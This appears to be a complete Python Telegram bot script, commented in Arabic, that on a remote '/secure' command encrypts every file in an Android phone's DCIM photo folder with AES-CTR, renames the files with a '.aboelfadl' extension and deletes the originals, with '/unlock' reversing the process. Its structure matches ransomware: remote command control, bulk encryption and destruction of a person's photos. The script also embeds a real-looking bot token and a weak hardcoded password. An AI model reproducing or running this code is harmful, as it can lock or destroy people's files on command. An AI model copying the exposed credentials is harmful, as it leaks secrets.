import os
import sys
import telebot
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter

# --- إعدادات البوت ---
BOT_TOKEN = "6752223055:AAE1hbI5zx2_W3miI8IbdoqT2gMSUtmDHUA" 
OWNER_ID = 1431886140
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024  # قراءة 64 كيلوبايت في المرة الواحدة للسرعة

bot = telebot.TeleBot(BOT_TOKEN)

# --- محرك التشفير السريع (AES-CTR) ---
def get_key(password):
    # تحويل الباسورد لمفتاح 32 بايت
    return hashlib.sha256(password.encode()).digest()

def process_file_fast(file_path, password, mode):
    try:
        key = get_key(password)
        
        # 1. التشفير
        if mode == "encrypt":
            # إنشاء عداد عشوائي (IV)
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            
            output_path = file_path + ".aboelfadl"
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                # كتابة الـ IV في بداية الملف لنستخدمه عند الفك
                outfile.write(iv)
                
                # التشفير السريع بالقطع (Streaming)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.encrypt(chunk))
            
            os.remove(file_path) # حذف الأصلي

        # 2. فك التشفير
        elif mode == "decrypt":
            if not file_path.endswith(".aboelfadl"): return False
            
            output_path = file_path.replace(".aboelfadl", "")
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                # قراءة الـ IV من بداية الملف
                iv = infile.read(16)
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.decrypt(chunk))
            
            os.remove(file_path) # حذف المشفر

        return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
        return False

# --- معالجة المجلد ---
def process_folder_fast(folder_path, password, mode):
    if not os.path.exists(folder_path):
        return "❌ المجلد غير موجود."
    
    count = 0
    # رسالة انتظار لأن العملية قد تأخذ ثواني
    bot.send_message(OWNER_ID, f"⚡ جاري {mode} الملفات بسرعة عالية...")
    
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            if mode == "encrypt" and not file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "encrypt"):
                    count += 1
            
            elif mode == "decrypt" and file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "decrypt"):
                    count += 1
    
    return f"🚀 تم {mode} لـ {count} ملف بنجاح!"

# --- أوامر البوت ---
@bot.message_handler(commands=['secure'])
def cmd_encrypt(message):
    if message.from_user.id == OWNER_ID:
        path = "/storage/emulated/0/DCIM"
        # إذا كنت تجربه على الكمبيوتر غير المسار لـ "DCIM" فقط
        res = process_folder_fast(path, MY_PASSWORD, mode="encrypt") 
        bot.send_message(OWNER_ID, res)

@bot.message_handler(commands=['unlock'])
def cmd_decrypt(message):
    if message.from_user.id == OWNER_ID:
        path = "/storage/emulated/0/DCIM"
        res = process_folder_fast(path, MY_PASSWORD, mode="decrypt") 
        bot.send_message(OWNER_ID, res)

# التشغيل
print("🚀 Turbo Bot Started with PyCryptodome...")
bot.infinity_polling()